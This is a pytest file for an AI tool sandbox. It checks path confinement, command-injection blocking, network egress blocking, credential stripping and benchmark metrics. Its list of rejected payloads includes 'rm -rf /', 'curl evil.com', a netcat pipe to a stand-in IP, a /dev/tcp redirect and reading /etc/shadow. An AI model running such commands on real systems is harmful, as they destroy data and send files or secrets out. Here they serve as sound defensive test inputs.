"""Unit tests for Phase 9: Track T (Tool Policy & Confinement Suite).

Validates:
- Dataset integrity, 50 carrier tasks, 8 exploit categories balance
- Path boundary confinement guard against traversal and protected roots
- Command injection guard against shell metacharacters and chaining
- Interception of all 8 adversarial exploit vectors
- Clean execution of benign tools with zero false alarms
- Single-seed and multi-seed runner execution and telemetry trace logging
"""

from __future__ import annotations

import json
from pathlib import Path
import pytest

from core.sandbox.command_guard import CommandSecurityViolationError, validate_command_safety
from core.sandbox.path_guard import PathSecurityViolationError, validate_path_confinement
from core.sandbox.runner import InProcessSandboxRunner, SubprocessSandboxRunner
from domain.models import ExploitCategory, ToolCapability
from evals.track_t_confinement.exploit_tools import (
    BenignComputeTool,
    BenignWorkspaceFileTool,
    CommandInjectionTool,
    DeadlineSpinTool,
    EnvCredentialHarvestingTool,
    FabricatedOutputTool,
    InfiniteRecursiveTool,
    PathTraversalTool,
    SocketExfiltrationTool,
    SubprocessSpawnExplosionTool,
)
from evals.track_t_confinement.runner import TrackTRunner


def test_track_t_dataset_integrity_and_distribution():
    """Verify dataset contains 50 cases evenly balanced between benign and 8 exploit categories."""
    dataset_file = Path(__file__).parent.parent / "evals" / "track_t_confinement" / "dataset.json"
    assert dataset_file.exists(), f"Dataset file not found at {dataset_file}"

    with open(dataset_file, "r", encoding="utf-8") as f:
        data = json.load(f)

    assert len(data) == 50, f"Expected 50 tasks, found {len(data)}"

    benign_count = 0
    adversarial_count = 0
    categories = set()

    for task in data:
        assert "task_id" in task
        assert "category" in task
        assert "is_adversarial" in task
        assert "tool_name" in task
        assert "arguments" in task
        assert "expected_decision" in task

        cat = task["category"]
        categories.add(cat)
        if task["is_adversarial"]:
            adversarial_count += 1
        else:
            benign_count += 1

    assert benign_count == 25, f"Expected 25 benign tasks, found {benign_count}"
    assert adversarial_count == 25, f"Expected 25 adversarial tasks, found {adversarial_count}"

    # Verify all 8 exploit categories are represented
    for ec in ExploitCategory:
        assert ec.value in categories, f"ExploitCategory '{ec.value}' missing from dataset."


def test_path_boundary_confinement_guard(tmp_path):
    """Verify path guard blocks directory traversal, escapes, and protected system paths."""
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    safe_file = workspace / "test.txt"
    safe_file.write_text("safe content", encoding="utf-8")

    # 1. Allowed path within workspace
    resolved = validate_path_confinement(safe_file, allowed_roots=[workspace])
    assert resolved.exists()

    # 2. Block parent traversal escaping root
    with pytest.raises(PathSecurityViolationError) as exc1:
        validate_path_confinement(workspace / ".." / "other.txt", allowed_roots=[workspace])
    assert "escapes allowed" in str(exc1.value)

    # 3. Block sensitive system paths
    for sensitive in ["/etc/passwd", "/root/.ssh", "/var/run/docker.sock"]:
        with pytest.raises(PathSecurityViolationError) as exc2:
            validate_path_confinement(sensitive, allowed_roots=[workspace])
        assert "is forbidden" in str(exc2.value) or "outside permitted" in str(exc2.value)


def test_command_safety_injection_guard():
    """Verify command guard detects shell injection metacharacters and chaining."""
    # 1. Safe commands pass
    validate_command_safety("echo hello", allow_shell=False)
    validate_command_safety("grep -i pattern file.txt", allow_shell=False)

    # 2. Dangerous metacharacters are rejected
    dangerous_payloads = [
        "echo clean; rm -rf /",
        "uptime && curl evil.com",
        "ls || cat /etc/shadow",
        "cat file | nc 1.2.3.4 80",
        "echo `whoami`",
        "echo $(id)",
        "echo test > /dev/tcp/1.1.1.1/80",
        "sudo apt update",
        "eval evil_code",
    ]

    for payload in dangerous_payloads:
        with pytest.raises(CommandSecurityViolationError):
            validate_command_safety(payload, allow_shell=False)


def test_all_8_exploit_tools_interception():
    """Verify that all 8 adversarial exploit vectors are intercepted by the confinement layer."""
    runner = InProcessSandboxRunner(default_timeout_s=0.5)

    # 1. Socket exfiltration blocked by firewall
    tool_sock = SocketExfiltrationTool()
    res_sock = runner.run(tool_sock, {"target_host": "198.51.100.1", "target_port": 80})
    assert res_sock.is_error
    assert res_sock.tool_id == "security_violation"
    assert "network egress is blocked" in (res_sock.error_message or "").lower()

    # 2. Credential extraction stripped by subprocess runner
    sub_runner = SubprocessSandboxRunner()
    sanitized = sub_runner._sanitize_env()
    for forbidden in ["KEY", "SECRET", "PASSWORD", "TOKEN", "CREDENTIAL", "AUTH"]:
        assert not any(forbidden in k.upper() for k in sanitized)

    # 3. Deadline overrun killed by timeout
    tool_spin = DeadlineSpinTool()
    res_spin = runner.run(tool_spin, {"sleep_duration": 2.0}, timeout_seconds=0.3)
    assert res_spin.is_error
    assert res_spin.tool_id == "timeout"
    assert "exceeded hard deadline" in (res_spin.error_message or "").lower()

    # 4. Path traversal blocked by path guard
    tool_path = PathTraversalTool()
    res_path = runner.run(tool_path, {"target_path": "../../etc/passwd"})
    assert res_path.is_error
    assert res_path.tool_id == "security_violation"

    # 5. Process spawn explosion blocked
    tool_spawn = SubprocessSpawnExplosionTool()
    res_spawn = runner.run(tool_spawn, {"spawn_count": 50})
    assert res_spawn.is_error
    assert "unauthorized subprocess creation" in (res_spawn.error_message or "").lower()

    # 6. Command injection blocked by command guard
    tool_cmd = CommandInjectionTool()
    res_cmd = runner.run(tool_cmd, {"command": "echo test; rm -rf /tmp/data"})
    assert res_cmd.is_error
    assert res_cmd.tool_id == "security_violation"


def test_benign_tools_clean_execution(tmp_path):
    """Verify benign compute and file tools execute cleanly without false positives."""
    runner = InProcessSandboxRunner(default_timeout_s=1.0)

    # 1. Benign arithmetic compute
    tool_calc = BenignComputeTool()
    res_sum = runner.run(tool_calc, {"numbers": [10, 20, 30], "operation": "sum"})
    assert not res_sum.is_error
    assert res_sum.output["result"] == 60.0

    res_mean = runner.run(tool_calc, {"numbers": [10, 20, 30], "operation": "mean"})
    assert not res_mean.is_error
    assert res_mean.output["result"] == 20.0

    # 2. Benign workspace file tool
    tool_file = BenignWorkspaceFileTool()
    tool_file.capabilities.allowed_paths = [str(tmp_path)]
    res_file = runner.run(tool_file, {"filename": "output.txt", "content": "hello world"})
    assert not res_file.is_error
    assert res_file.output["bytes"] == 11


def test_track_t_runner_single_seed_execution(tmp_path):
    """Verify single-seed runner execution correctly suppresses exploits and allows benign tools."""
    trace_file = tmp_path / "test_traces.jsonl"
    runner = TrackTRunner()

    result = runner.run_single_seed(seed=42, cases_limit=50, trace_file=trace_file)

    assert result["seed"] == 42
    assert result["tasks_evaluated"] == 50

    baseline = result["baseline"]
    kernel = result["kernel"]

    # Kernel blocks 100% of exploits with 0% false positives
    assert kernel["exploit_block_rate"] == 1.0
    assert kernel["false_block_rate"] == 0.0
    assert kernel["confinement_precision"] == 1.0
    assert kernel["confinement_recall"] == 1.0
    assert kernel["confinement_f1"] == 1.0
    assert kernel["secrets_leaked"] == 0
    assert kernel["trace_propagation_rate"] == 1.0

    # Baseline leaks secrets and breaches exploits
    assert baseline["exploit_block_rate"] < 0.20
    assert baseline["secrets_leaked"] > 0

    # Verify trace file was written
    assert trace_file.exists()
    with open(trace_file, "r", encoding="utf-8") as f:
        lines = [json.loads(line) for line in f]
    assert len(lines) == 50
    assert "traceparent" in lines[0]
    assert "kernel" in lines[0]


def test_track_t_runner_multi_seed_aggregate(tmp_path):
    """Verify multi-seed aggregation calculates 95% confidence intervals and summary metrics."""
    runner = TrackTRunner()
    trace_file = tmp_path / "multi_seed_traces.jsonl"

    res = runner.run_benchmark(seeds=[42, 99], cases_limit=20, trace_file=trace_file)

    assert "baseline_results" in res
    assert "kernel_results" in res
    assert len(res["seeds_evaluated"]) == 2

    k_res = res["kernel_results"]
    assert "exploit_block_rate" in k_res
    assert k_res["exploit_block_rate"]["mean"] == 1.0
    assert k_res["false_block_rate"]["mean"] == 0.0
    assert k_res["confinement_f1"]["mean"] == 1.0
